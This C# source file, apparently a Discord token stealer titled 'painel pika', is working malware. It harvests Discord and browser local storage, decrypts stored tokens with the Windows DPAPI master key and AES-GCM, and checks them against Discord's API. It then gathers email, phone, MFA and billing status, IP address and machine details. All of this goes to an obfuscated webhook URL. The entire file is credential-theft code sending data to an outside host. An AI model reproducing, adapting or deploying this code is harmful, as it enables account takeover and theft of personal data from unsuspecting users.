using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Text.Json;
using System.Text.Json.Nodes;

namespace PainelPika
{
    class Program
    {
        // P/Invoke for Windows APIs
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool GetVersionExW(ref OSVERSIONINFOEXW osvi);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct OSVERSIONINFOEXW
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public ushort wServicePackMajor;
            public ushort wServicePackMinor;
            public ushort wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            IntPtr szDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        // Compile-time XOR string obfuscation equivalent (runtime in C#)
        private static string XORString(string input, string key)
        {
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
            {
                result.Append((char)(input[i] ^ key[i % key.Length]));
            }
            return result.ToString();
        }

        // Get Windows version
        private static string GetWindowsVersion()
        {
            OSVERSIONINFOEXW osInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
            GetVersionExW(ref osInfo);
            StringBuilder ss = new StringBuilder();
            ss.Append("Windows ").Append(osInfo.dwMajorVersion);
            if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 22000)
            {
                ss.Append(" (11)");
            }
            return ss.ToString();
        }

        // Get environment variable
        private static string GetEnvVar(string name)
        {
            return Environment.GetEnvironmentVariable(name) ?? "";
        }

        // Execute command and get output
        private static string ExecuteCommand(string cmd)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C {cmd}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process? process = Process.Start(psi);
            if (process == null)
            {
                return "";
            }
            using (process)
            {
                string output = process.StandardOutput.ReadToEnd();
                output += process.StandardError.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }

        // Get hardware ID (not used, but kept for fidelity)
        private static string GetHWID()
        {
            string output = ExecuteCommand("wmic csproduct get uuid");
            string[] lines = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);
            return lines.Length > 1 ? lines[1].Trim() : "";
        }

        // Get external IP
        private static async Task<string> GetIPAsync()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string url = XORString("https://api.ipify.org", "AstraaDevKey");
                    HttpResponseMessage res = await client.GetAsync(url);
                    if (res.IsSuccessStatusCode)
                    {
                        return await res.Content.ReadAsStringAsync();
                    }
                }
                catch { }
            }
            return "None";
        }

        // Base64 decode
        private static byte[] Base64Decode(string? input)
        {
            if (string.IsNullOrEmpty(input))
            {
                return Array.Empty<byte>();
            }
            return Convert.FromBase64String(input);
        }

        // XOR encryption/decryption
        private static string XORCrypt(string data, string key)
        {
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < data.Length; i++)
            {
                result.Append((char)(data[i] ^ key[i % key.Length]));
            }
            return result.ToString();
        }

        // AES-GCM decryption
        private static string Decrypt(byte[] cipher, byte[] masterKey)
        {
            try
            {
                DATA_BLOB input = new DATA_BLOB { pbData = Marshal.UnsafeAddrOfPinnedArrayElement(masterKey, 0), cbData = (uint)masterKey.Length };
                DATA_BLOB output = new DATA_BLOB();
                if (CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                {
                    byte[] unprotectedKey = new byte[output.cbData];
                    Marshal.Copy(output.pbData, unprotectedKey, 0, (int)output.cbData);
                    using (AesGcm aesGcm = new AesGcm(unprotectedKey))
                    {
                        byte[] nonce = new byte[12];
                        Array.Copy(cipher, 3, nonce, 0, 12);
                        byte[] ciphertext = new byte[cipher.Length - 31];
                        Array.Copy(cipher, 15, ciphertext, 0, ciphertext.Length);
                        byte[] tag = new byte[16];
                        Array.Copy(cipher, cipher.Length - 16, tag, 0, 16);

                        byte[] plaintext = new byte[ciphertext.Length];
                        aesGcm.Decrypt(nonce, ciphertext, tag, plaintext);
                        return Encoding.UTF8.GetString(plaintext);
                    }
                }
            }
            catch { }
            return "Error";
        }

        // Get tokens
        private static async Task GetTokensAsync(List<string> tokens, List<string> cleaned)
        {
            string local = GetEnvVar("LOCALAPPDATA");
            string roaming = GetEnvVar("APPDATA");
            string chrome = Path.Combine(local, "Google", "Chrome", "User Data");
            Dictionary<string, string> paths = new Dictionary<string, string>
            {
                {"Discord", Path.Combine(roaming, "discord")},
                {"Discord Canary", Path.Combine(roaming, "discordcanary")},
                {"Lightcord", Path.Combine(roaming, "Lightcord")},
                {"Discord PTB", Path.Combine(roaming, "discordptb")},
                {"Opera", Path.Combine(roaming, "Opera Software", "Opera Stable")},
                {"Opera GX", Path.Combine(roaming, "Opera Software", "Opera GX Stable")},
                {"Amigo", Path.Combine(local, "Amigo", "User Data")},
                {"Torch", Path.Combine(local, "Torch", "User Data")},
                {"Kometa", Path.Combine(local, "Kometa", "User Data")},
                {"Orbitum", Path.Combine(local, "Orbitum", "User Data")},
                {"CentBrowser", Path.Combine(local, "CentBrowser", "User Data")},
                {"7Star", Path.Combine(local, "7Star", "7Star", "User Data")},
                {"Sputnik", Path.Combine(local, "Sputnik", "Sputnik", "User Data")},
                {"Vivaldi", Path.Combine(local, "Vivaldi", "User Data", "Default")},
                {"Chrome SxS", Path.Combine(local, "Google", "Chrome SxS", "User Data")},
                {"Chrome", Path.Combine(chrome, "Default")},
                {"Epic Privacy Browser", Path.Combine(local, "Epic Privacy Browser", "User Data")},
                {"Microsoft Edge", Path.Combine(local, "Microsoft", "Edge", "User Data", "Default")},
                {"Uran", Path.Combine(local, "uCozMedia", "Uran", "User Data", "Default")},
                {"Yandex", Path.Combine(local, "Yandex", "YandexBrowser", "User Data", "Default")},
                {"Brave", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data", "Default")},
                {"Iridium", Path.Combine(local, "Iridium", "User Data", "Default")}
            };

            string key = "AstraaDevKey";
            string regex_encrypted_b64 = "JSIDRhZYEwIuKDRDaSg1XzsAaR9GZlxSbk4pWUg=";
            string api_me_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJA==";
            string api_billing_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWN0JEXRQSIRcFZCUUJFwWGw0NLQsRZBYMIwAXAAgRMAwZJRY=";
            string webhook_encrypted_b64 = "KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWNhYWGg4OLxZZelFJckNDR1dUdlxHclFAc0VESk4PFQFAIQkedEQVNjgyGy89OAQIHiABAlYLIQRDJUhBORIgFFcKdxcQPTAPdSMtQjgnGw9OISkmFzUsPwYEFQkTIzwqDw==";

            string regex_pattern = XORCrypt(Encoding.UTF8.GetString(Base64Decode(regex_encrypted_b64)), key);
            string api_me_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(api_me_encrypted_b64)), key);
            string api_billing_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(api_billing_encrypted_b64)), key);
            string webhook_url = XORCrypt(Encoding.UTF8.GetString(Base64Decode(webhook_encrypted_b64)), key);

            foreach (var kvp in paths)
            {
                string platform_name = kvp.Key;
                string path = kvp.Value;
                if (!Directory.Exists(path)) continue;

                string local_state_path = Path.Combine(path, "Local State");
                if (!File.Exists(local_state_path)) continue;

                string buffer = File.ReadAllText(local_state_path);
                JsonDocument local_state_doc = JsonDocument.Parse(buffer);
                JsonElement local_state = local_state_doc.RootElement;
                if (!local_state.TryGetProperty("os_crypt", out JsonElement os_crypt) ||
                    !os_crypt.TryGetProperty("encrypted_key", out JsonElement encrypted_key_elem)) continue;

                string? encrypted_key_str = encrypted_key_elem.GetString();
                if (encrypted_key_str == null) continue;
                byte[] encrypted_key = Base64Decode(encrypted_key_str);
                byte[] master_key = new byte[encrypted_key.Length - 5];
                Array.Copy(encrypted_key, 5, master_key, 0, master_key.Length);

                string leveldb_dir = Path.Combine(path, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldb_dir)) continue;

                foreach (string file_path in Directory.EnumerateFiles(leveldb_dir, "*.*", SearchOption.TopDirectoryOnly)
                    .Where(f => f.EndsWith(".ldb") || f.EndsWith(".log")))
                {
                    string file_content = File.ReadAllText(file_path);
                    MatchCollection matches = Regex.Matches(file_content, regex_pattern);
                    foreach (Match match in matches)
                    {
                        if (match.Value != null)
                        {
                            tokens.Add(match.Value);
                        }
                    }
                }

                List<string> already_check = new List<string>();
                foreach (string token in tokens)
                {
                    string clean_token = token;
                    if (clean_token.EndsWith("\\")) clean_token = clean_token.Substring(0, clean_token.Length - 1);
                    if (!cleaned.Contains(clean_token))
                    {
                        cleaned.Add(clean_token);
                    }
                }

                using (HttpClient cli = new HttpClient())
                {
                    foreach (string token in cleaned)
                    {
                        string tok;
                        try
                        {
                            int pos = token.IndexOf("dQw4w9WgXcQ:") + 13;
                            if (pos < 13) continue;
                            byte[] decoded = Base64Decode(token.Substring(pos));
                            tok = Decrypt(decoded, master_key);
                            if (tok == "Error") continue;
                        }
                        catch { continue; }

                        if (already_check.Contains(tok)) continue;
                        already_check.Add(tok);

                        cli.DefaultRequestHeaders.Clear();
                        cli.DefaultRequestHeaders.Add("Authorization", tok);
                        cli.DefaultRequestHeaders.Add("Content-Type", "application/json");

                        HttpResponseMessage res = await cli.GetAsync(api_me_url);
                        if (!res.IsSuccessStatusCode) continue;

                        string res_body = await res.Content.ReadAsStringAsync();
                        JsonDocument res_json_doc = JsonDocument.Parse(res_body);
                        JsonElement res_json = res_json_doc.RootElement;

                        string ip = await GetIPAsync();
                        string pc_username = GetEnvVar("UserName");
                        string pc_name = GetEnvVar("COMPUTERNAME");
                        string? user_name_disc = res_json.GetProperty("username").GetString();
                        string? discriminator = res_json.GetProperty("discriminator").GetString();
                        string user_name = $"{user_name_disc ?? "Unknown"}#{discriminator ?? "0000"}";
                        string user_id = res_json.GetProperty("id").GetString() ?? "Unknown";
                        string email = res_json.GetProperty("email").GetString() ?? "None";
                        string? phone = res_json.TryGetProperty("phone", out JsonElement phoneElem) && phoneElem.ValueKind != JsonValueKind.Null ? phoneElem.GetString() ?? "None" : "None";
                        bool mfa_enabled = res_json.GetProperty("mfa_enabled").GetBoolean();
                        bool has_nitro = false;
                        int days_left = 0;

                        res = await cli.GetAsync(api_billing_url);
                        if (res.IsSuccessStatusCode)
                        {
                            string nitro_body = await res.Content.ReadAsStringAsync();
                            JsonDocument nitro_data_doc = JsonDocument.Parse(nitro_body);
                            JsonElement nitro_data = nitro_data_doc.RootElement;
                            has_nitro = nitro_data.GetArrayLength() > 0;
                            if (has_nitro)
                            {
                                JsonElement first = nitro_data[0];
                                string? end = first.GetProperty("current_period_end").GetString();
                                string? start = first.GetProperty("current_period_start").GetString();
                                if (end != null && start != null)
                                {
                                    end = end.Substring(0, 19);
                                    start = start.Substring(0, 19);
                                    DateTime t1 = DateTime.ParseExact(end, "yyyy-MM-ddTHH:mm:ss", null);
                                    DateTime t2 = DateTime.ParseExact(start, "yyyy-MM-ddTHH:mm:ss", null);
                                    days_left = Math.Abs((int)(t1 - t2).TotalDays);
                                }
                            }
                        }

                        StringBuilder embed = new StringBuilder();
                        embed.Append(user_name).Append(" (").Append(user_id).Append(")\n\n")
                             .Append("> :dividers: Account Information\n")
                             .Append("\tEmail: ").Append(email).Append("\n")
                             .Append("\tPhone: ").Append(phone).Append("\n")
                             .Append("\t2FA/MFA Enabled: ").Append(mfa_enabled ? "True" : "False").Append("\n")
                             .Append("\tNitro: ").Append(has_nitro ? "True" : "False").Append("\n")
                             .Append("\tExpires in: ").Append(days_left > 0 ? days_left.ToString() : "None").Append(" day(s)\n")
                             .Append(":computer: PC Information\n")
                             .Append("\tIP: ").Append(ip).Append("\n")
                             .Append("\tUsername: ").Append(pc_username).Append("\n")
                             .Append("\tPC Name: ").Append(pc_name).Append("\n")
                             .Append("\tPlatform: ").Append(GetWindowsVersion()).Append("\n")
                             .Append(":piÃ±ata: Token\n")
                             .Append("\t").Append(tok).Append("\n")
                             .Append("Made by Astraa#6100 | ||https://github.com/astraadev||");

                        var payload = new
                        {
                            content = embed.ToString(),
                            username = "painel pika- Made by Astraa",
                            avatar_url = XORString("https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg", key)
                        };

                        string jsonPayload = JsonSerializer.Serialize(payload);
                        using (HttpClient webhook_cli = new HttpClient())
                        {
                            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                            await webhook_cli.PostAsync(webhook_url, content);
                        }
                    }
                }
            }
        }

        static async Task Main(string[] args)
        {
            List<string> tokens = new List<string>();
            List<string> cleaned = new List<string>();
            await GetTokensAsync(tokens, cleaned);
            Console.WriteLine("Finished. Press any key to exit...");
            Console.ReadKey();
        }
    }
}
